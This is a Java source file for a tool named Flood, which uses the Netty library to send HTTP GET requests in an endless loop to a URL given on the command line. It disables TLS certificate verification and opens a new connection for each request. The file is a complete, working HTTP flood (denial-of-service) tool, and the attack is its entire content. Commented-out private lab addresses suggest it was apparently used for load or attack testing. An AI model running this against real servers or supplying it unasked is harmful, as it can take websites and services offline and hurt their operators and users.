package hvqzao.http;

import io.netty.bootstrap.Bootstrap;
import io.netty.channel.ChannelFuture;
import io.netty.channel.ChannelHandlerContext;
import io.netty.channel.ChannelInboundHandlerAdapter;
import io.netty.channel.ChannelInitializer;
import io.netty.channel.EventLoopGroup;
import io.netty.channel.nio.NioEventLoopGroup;
import io.netty.channel.socket.SocketChannel;
import io.netty.channel.ChannelOption;
import io.netty.channel.socket.nio.NioSocketChannel;
import io.netty.handler.codec.http.DefaultHttpRequest;
import io.netty.handler.codec.http.HttpHeaders;
import io.netty.handler.codec.http.HttpMethod;
import io.netty.handler.codec.http.HttpVersion;
import io.netty.handler.codec.http.HttpRequestEncoder;
import io.netty.handler.ssl.SslContext;
import io.netty.handler.ssl.SslContextBuilder;
import io.netty.handler.ssl.util.InsecureTrustManagerFactory;
import java.net.URI;
import java.security.KeyManagementException;

public class Flood {

    private final EventLoopGroup workerGroup = new NioEventLoopGroup();
    private final Bootstrap b;
    private final DefaultHttpRequest request;
    private final String host;
    private final int port;

    public Flood(URI uri) throws KeyManagementException {
        this.host = uri.getHost();
        this.port = uri.getPort();
        boolean isHttps = "https".equals(uri.getScheme());
        b = new Bootstrap();
        b.group(workerGroup);
        b.channel(NioSocketChannel.class)
                .option(ChannelOption.TCP_NODELAY, true)
                .option(ChannelOption.SO_REUSEADDR, true);
        b.handler(new ChannelInitializer<SocketChannel>() {
            @Override
            public void initChannel(SocketChannel ch) throws Exception {
                if (isHttps) {
                    SslContext sslCtx = SslContextBuilder.forClient().trustManager(InsecureTrustManagerFactory.INSTANCE).build();
                    ch.pipeline()
                            .addLast(sslCtx.newHandler(ch.alloc(), host, port));
                }
                ch.pipeline()
                        .addLast(new HttpRequestEncoder())
                        .addLast(new Handler());
            }
        });
        request = new DefaultHttpRequest(
                HttpVersion.HTTP_1_1,
                HttpMethod.GET,
                uri.getPath());
        request.headers()
                .set(HttpHeaders.Names.HOST, host)
                .set(HttpHeaders.Names.CONNECTION, HttpHeaders.Values.CLOSE);
    }

    public void terminate() {
        workerGroup.shutdownGracefully();
    }

    public void go() {
        ChannelFuture f = b.connect(host, port);
        f.addListener((future) -> {
            if (future.isSuccess()) {
                f.channel()
                        .write(request);
                f.channel()
                        .flush()
                        .closeFuture();
            }
        });
    }

    private class Handler extends ChannelInboundHandlerAdapter {

        @Override
        public void exceptionCaught(ChannelHandlerContext ctx, Throwable cause) {
            ctx.close();
        }
    }

    public static void main(String[] args) throws Exception {
        //String target = "https://192.168.132.136:8844/";
        //String target = "http://192.168.253.135:8844/aa";
        if (args.length < 1) {
            System.err.println("Usage: http-flood URL");
            System.exit(1);
        }
        String target = args[0];
        URI uri = new URI(target);
        Flood flood = new Flood(uri);
        while (true) {
            flood.go();
        }
        //System.out.println("asdf");
        //flood.terminate();
        //while (true) {
        //    Thread.sleep(1000);
        //}
    }
}
